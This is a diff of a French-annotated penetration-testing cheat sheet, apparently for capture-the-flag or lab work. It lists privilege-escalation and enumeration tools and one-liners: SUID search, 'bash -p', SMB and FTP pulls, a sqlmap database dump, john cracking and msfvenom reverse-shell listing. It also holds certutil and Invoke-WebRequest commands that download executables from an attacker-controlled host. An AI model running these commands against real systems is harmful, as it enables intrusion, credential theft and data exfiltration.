@@ -13,7 +13,7 @@ _______________________________ /\
 [URL] linPEAS : https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS
 [URL] winPEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat (.bat)
 [URL] netcat for windows : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
-
+[URL] hacker tools : https://addons.mozilla.org/en-US/firefox/addon/hacktools/
 -------------------------------------------------------------------------------------------------------------------------------------------+
 
 [+] => PAYLOADSALLTHETHINGS     - https://github.com/swisskyrepo/PayloadsAllTheThings (reverse shell, etc...)
@@ -27,24 +27,25 @@ _______________________________ /\
 
 -------------------------------------------------------------------------------------------------------------------------------------------+
 
-[CMD](BINARIES) => find / -user root -perm -4000 -exec ls -ldb {} \;
-[CMD](ENUM)     => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list>
-[CMD](ENUM)     => nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP  (SAMBA)
+[CMD](misconfig) => bash -p 
+[CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
+[CMD](ENUM)      => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list> -b <status_code_to_exclude>
+[CMD](ENUM)      => nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP  (SAMBA)
                    smbclient //<ip>/anonymous (-U pour un utilisateurs)
                    smbget -R smb://<ip>/anonymous
-[CMD](list)     => msfvenom -l payloads | grep windows | grep reverse | grep shell  (exemple)
-[CMD](decrypt)  => john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=<format>
-[CMD](sql)      => sqlmap -r file.txt --dbms=mysql --dump | (après avoir copier une requête Burp dans un fichier txt)
-[CMD](ftp)      => wget -m --no-passive ftp://anonymous:anonymous@<IP>  (download tout)
+[CMD](list)      => msfvenom -l payloads | grep windows | grep reverse | grep shell  (exemple)
+[CMD](decrypt)   => john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=<format>
+[CMD](sql)       => sqlmap -r file.txt --dbms=mysql --dump | (après avoir copier une requête Burp dans un fichier txt)
+[CMD](ftp)       => wget -m --no-passive ftp://anonymous:anonymous@<IP>  (download tout)
 
-[RDP]           => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard
+[RDP]            => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard
 
-[CMD](WIN)*PS*  => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
-[CMD](WIN)*PS*  => Expand-Archive <file.zip>
-[CMD](AD)*PS*   => Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
-[CMD](AD)*PS*   => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose 
+[CMD](WIN)*PS*   => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
+[CMD](WIN)*PS*   => Expand-Archive <file.zip>
+[CMD](AD)*PS*    => Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+[CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose 
 
-[CMD](WIN)*CMD* => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
+[CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
 
 -------------------------------------------------------------------------------------------------------------------------------------------+
 
